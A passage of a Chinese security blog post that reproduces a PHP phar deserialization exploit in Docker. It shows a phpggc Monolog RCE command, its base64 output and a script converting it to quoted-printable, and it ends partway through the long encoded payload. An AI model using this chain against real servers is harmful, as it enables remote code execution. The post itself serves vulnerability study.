<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Be aware that iconv in PHP uses system implementations of locales and languages, what works under linux, normally doesn&#39;t in windows.</span><br></pre></td></tr></table></figure>


<p>这里搭个docker复现一下</p>
<h3 id="反向生成真正的payload"><a href="#反向生成真正的payload" class="headerlink" title="反向生成真正的payload"></a>反向生成真正的payload</h3><p>先用phpggc生成一个pop链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d &#39;phar.readonly&#x3D;0&#39; phpggc monolog&#x2F;rce1 call_user_func phpinfo --phar phar -o php:&#x2F;&#x2F;output | base64 -w0</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQrZAgAAAgAAABEAAAABAAAAAACCAgAATzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7TzoyOToiTW9ub2xvZ1xIYW5kbGVyXEJ1ZmZlckhhbmRsZXIiOjc6e3M6MTA6IgAqAGhhbmRsZXIiO047czoxMzoiACoAYnVmZmVyU2l6ZSI7aTotMTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntpOjA7czo3OiJwaHBpbmZvIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6MTQ6ImNhbGxfdXNlcl9mdW5jIjt9fXM6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6NzoicGhwaW5mbyI7czo1OiJsZXZlbCI7Tjt9fXM6ODoiACoAbGV2ZWwiO047czoxNDoiACoAaW5pdGlhbGl6ZWQiO2I6MTtzOjE0OiIAKgBidWZmZXJMaW1pdCI7aTotMTtzOjEzOiIAKgBwcm9jZXNzb3JzIjthOjI6e2k6MDtzOjc6ImN1cnJlbnQiO2k6MTtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7fX19BQAAAGR1bW15BAAAAJkpFWAEAAAADH5&#x2F;2KQBAAAAAAAACAAAAHRlc3QudHh0BAAAAJkpFWAEAAAADH5&#x2F;2KQBAAAAAAAAdGVzdHRlc3RIRck8aVAlWlhWNxBzTEgbZgXQ1QIAAABHQk1C</span><br></pre></td></tr></table></figure>
<p>生成quoted-printable字符串   直接用大佬的脚本了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s=<span class="string">&quot;PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQrZAgAAAgAAABEAAAABAAAAAACCAgAATzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7TzoyOToiTW9ub2xvZ1xIYW5kbGVyXEJ1ZmZlckhhbmRsZXIiOjc6e3M6MTA6IgAqAGhhbmRsZXIiO047czoxMzoiACoAYnVmZmVyU2l6ZSI7aTotMTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntpOjA7czo3OiJwaHBpbmZvIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6MTQ6ImNhbGxfdXNlcl9mdW5jIjt9fXM6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6NzoicGhwaW5mbyI7czo1OiJsZXZlbCI7Tjt9fXM6ODoiACoAbGV2ZWwiO047czoxNDoiACoAaW5pdGlhbGl6ZWQiO2I6MTtzOjE0OiIAKgBidWZmZXJMaW1pdCI7aTotMTtzOjEzOiIAKgBwcm9jZXNzb3JzIjthOjI6e2k6MDtzOjc6ImN1cnJlbnQiO2k6MTtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7fX19BQAAAGR1bW15BAAAAJkpFWAEAAAADH5/2KQBAAAAAAAACAAAAHRlc3QudHh0BAAAAJkpFWAEAAAADH5/2KQBAAAAAAAAdGVzdHRlc3RIRck8aVAlWlhWNxBzTEgbZgXQ1QIAAABHQk1C&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.join([<span class="string">&quot;=&quot;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:] + <span class="string">&quot;=00&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> s]).upper()</span><br><span class="line"><span class="string">&#x27;=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=5A=00=41=00=67=00=41=00=41=00=41=00=67=00=41=00</span></span><br></pre></td></tr></table></figure>
<p>这里用的小端字节序 00写在后面，其实这里用大端字节序也是可以的，把00补充在前面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.join([&quot;&#x3D;00&quot;+&quot;&#x3D;&quot; + hex(ord(i))[2:] for i in t]).upper()</span><br></pre></td></tr></table></figure>


<p>最后的pop链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;50&#x3D;00&#x3D;44&#x3D;00&#x3D;39&#x3D;00&#x3D;77&#x3D;00&#x3D;61&#x3D;00&#x3D;48&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;58&#x3D;00&#x3D;31&#x3D;00&#x3D;39&#x3D;00&#x3D;49&#x3D;00&#x3D;51&#x3D;00&#x3D;55&#x3D;00&#x3D;78&#x3D;00&#x3D;55&#x3D;00&#x3D;58&#x3D;00&#x3D;30&#x3D;00&#x3D;4E&#x3D;00&#x3D;50&#x3D;00&#x3D;54&#x3D;00&#x3D;56&#x3D;00&#x3D;42&#x3D;00&#x3D;4A&#x3D;00&#x3D;54&#x3D;00&#x3D;45&#x3D;00&#x3D;56&#x3D;00&#x3D;53&#x3D;00&#x3D;4B&#x3D;00&#x3D;43&#x3D;00&#x3D;6B&#x3D;00&#x3D;37&#x3D;00&#x3D;49&#x3D;00&#x3D;44&#x3D;00&#x3D;38&#x3D;00&#x3D;2B&#x3D;00&#x3D;44&#x3D;00&#x3D;51&#x3D;00&#x3D;72&#x3D;00&#x3D;5A&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;42&#x3D;00&#x3D;45&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;43&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;54&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;7A&#x3D;00&#x3D;4D&#x3D;00&#x3D;6A&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;54&#x3D;00&#x3D;57&#x3D;00&#x3D;39&#x3D;00&#x3D;75&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;78&#x3D;00&#x3D;76&#x3D;00&#x3D;5A&#x3D;00&#x3D;31&#x3D;00&#x3D;78&#x3D;00&#x3D;49&#x3D;00&#x3D;59&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;6B&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;58&#x3D;00&#x3D;46&#x3D;00&#x3D;4E&#x3D;00&#x3D;35&#x3D;00&#x3D;63&#x3D;00&#x3D;32&#x3D;00&#x3D;78&#x3D;00&#x3D;76&#x3D;00&#x3D;5A&#x3D;00&#x3D;31&#x3D;00&#x3D;56&#x3D;00&#x3D;6B&#x3D;00&#x3D;63&#x3D;00&#x3D;45&#x3D;00&#x3D;68&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;52&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;36&#x3D;00&#x3D;65&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4F&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;63&#x3D;00&#x3D;32&#x3D;00&#x3D;39&#x3D;00&#x3D;6A&#x3D;00&#x3D;61&#x3D;00&#x3D;32&#x3D;00&#x3D;56&#x3D;00&#x3D;30&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;50&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;49&#x3D;00&#x3D;35&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;4E&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;35&#x3D;00&#x3D;76&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;39&#x3D;00&#x3D;6E&#x3D;00&#x3D;58&#x3D;00&#x3D;45&#x3D;00&#x3D;68&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;52&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;4A&#x3D;00&#x3D;63&#x3D;00&#x3D;51&#x3D;00&#x3D;6E&#x3D;00&#x3D;56&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;53&#x3D;00&#x3D;47&#x3D;00&#x3D;46&#x3D;00&#x3D;75&#x3D;00&#x3D;5A&#x3D;00&#x3D;47&#x3D;00&#x3D;78&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;36&#x3D;00&#x3D;4E&#x3D;00&#x3D;7A&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4D&#x3D;00&#x3D;44&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;61&#x3D;00&#x3D;47&#x3D;00&#x3D;46&#x3D;00&#x3D;75&#x3D;00&#x3D;5A&#x3D;00&#x3D;47&#x3D;00&#x3D;78&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;54&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;79&#x3D;00&#x3D;4F&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;54&#x3D;00&#x3D;57&#x3D;00&#x3D;39&#x3D;00&#x3D;75&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;78&#x3D;00&#x3D;76&#x3D;00&#x3D;5A&#x3D;00&#x3D;31&#x3D;00&#x3D;78&#x3D;00&#x3D;49&#x3D;00&#x3D;59&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;6B&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;58&#x3D;00&#x3D;45&#x3D;00&#x3D;4A&#x3D;00&#x3D;31&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;6B&#x3D;00&#x3D;68&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;52&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;63&#x3D;00&#x3D;36&#x3D;00&#x3D;65&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;41&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;68&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;52&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;30&#x3D;00&#x3D;34&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4D&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;59&#x3D;00&#x3D;6E&#x3D;00&#x3D;56&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;55&#x3D;00&#x3D;32&#x3D;00&#x3D;6C&#x3D;00&#x3D;36&#x3D;00&#x3D;5A&#x3D;00&#x3D;53&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;74&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;6B&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;4A&#x3D;00&#x3D;31&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;59&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4F&#x3D;00&#x3D;6E&#x3D;00&#x3D;74&#x3D;00&#x3D;70&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;41&#x3D;00&#x3D;37&#x3D;00&#x3D;59&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;79&#x3D;00&#x3D;4F&#x3D;00&#x3D;6E&#x3D;00&#x3D;74&#x3D;00&#x3D;70&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;41&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;33&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;77&#x3D;00&#x3D;61&#x3D;00&#x3D;48&#x3D;00&#x3D;42&#x3D;00&#x3D;70&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;76&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;55&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;6D&#x3D;00&#x3D;78&#x3D;00&#x3D;6C&#x3D;00&#x3D;64&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;73&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;4F&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;31&#x3D;00&#x3D;39&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;34&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;62&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;54&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;30&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;70&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;6C&#x3D;00&#x3D;30&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;46&#x3D;00&#x3D;73&#x3D;00&#x3D;61&#x3D;00&#x3D;58&#x3D;00&#x3D;70&#x3D;00&#x3D;6C&#x3D;00&#x3D;5A&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;59&#x3D;00&#x3D;6A&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;51&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;4A&#x3D;00&#x3D;31&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;6B&#x3D;00&#x3D;78&#x3D;00&#x3D;70&#x3D;00&#x3D;62&#x3D;00&#x3D;57&#x3D;00&#x3D;6C&#x3D;00&#x3D;30&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;70&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;30&#x3D;00&#x3D;78&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;48&#x3D;00&#x3D;42&#x3D;00&#x3D;79&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;4E&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;33&#x3D;00&#x3D;4E&#x3D;00&#x3D;76&#x3D;00&#x3D;63&#x3D;00&#x3D;6E&#x3D;00&#x3D;4D&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;45&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;6A&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;77&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4E&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;59&#x3D;00&#x3D;33&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;63&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;75&#x3D;00&#x3D;64&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;51&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;6D&#x3D;00&#x3D;4E&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;78&#x3D;00&#x3D;66&#x3D;00&#x3D;64&#x3D;00&#x3D;58&#x3D;00&#x3D;4E&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;6C&#x3D;00&#x3D;39&#x3D;00&#x3D;6D&#x3D;00&#x3D;64&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;6A&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;39&#x3D;00&#x3D;66&#x3D;00&#x3D;58&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;4A&#x3D;00&#x3D;31&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;6C&#x3D;00&#x3D;4E&#x3D;00&#x3D;70&#x3D;00&#x3D;65&#x3D;00&#x3D;6D&#x3D;00&#x3D;55&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;6B&#x3D;00&#x3D;36&#x3D;00&#x3D;4C&#x3D;00&#x3D;54&#x3D;00&#x3D;45&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;35&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;69&#x3D;00&#x3D;64&#x3D;00&#x3D;57&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;45&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;77&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;45&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;6A&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;77&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4E&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;63&#x3D;00&#x3D;47&#x3D;00&#x3D;68&#x3D;00&#x3D;77&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;6D&#x3D;00&#x3D;62&#x3D;00&#x3D;79&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;31&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;62&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;54&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;39&#x3D;00&#x3D;66&#x3D;00&#x3D;58&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4F&#x3D;00&#x3D;44&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;32&#x3D;00&#x3D;5A&#x3D;00&#x3D;57&#x3D;00&#x3D;77&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;30&#x3D;00&#x3D;34&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4E&#x3D;00&#x3D;44&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;70&#x3D;00&#x3D;64&#x3D;00&#x3D;47&#x3D;00&#x3D;6C&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;6C&#x3D;00&#x3D;36&#x3D;00&#x3D;5A&#x3D;00&#x3D;57&#x3D;00&#x3D;51&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;49&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;30&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;69&#x3D;00&#x3D;64&#x3D;00&#x3D;57&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;4A&#x3D;00&#x3D;4D&#x3